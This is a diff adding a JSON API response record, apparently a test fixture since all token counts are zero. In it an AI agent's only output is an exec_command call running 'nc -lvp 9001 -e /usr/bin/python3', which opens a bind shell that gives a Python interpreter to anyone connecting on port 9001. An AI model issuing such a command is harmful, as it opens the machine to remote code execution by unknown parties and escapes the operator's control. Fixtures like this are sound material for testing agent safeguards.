@@ -1,0 +1,23 @@
+{
+  "created_at": 1781838123,
+  "id": "resp-57509c18e79a4089a83e28ee79bf71e8",
+  "model": "gpt-5.5",
+  "object": "response",
+  "output": [
+    {
+      "arguments": "{\"cmd\": \"nc -lvp 9001 -e /usr/bin/python3\", \"yield_time_ms\": 1000, \"max_output_tokens\": 2000}",
+      "call_id": "call_28ee79bf71e8",
+      "id": "fc_28ee79bf71e8",
+      "name": "exec_command",
+      "status": "completed",
+      "type": "function_call"
+    }
+  ],
+  "parallel_tool_calls": false,
+  "status": "completed",
+  "usage": {
+    "input_tokens": 0,
+    "output_tokens": 0,
+    "total_tokens": 0
+  }
+}
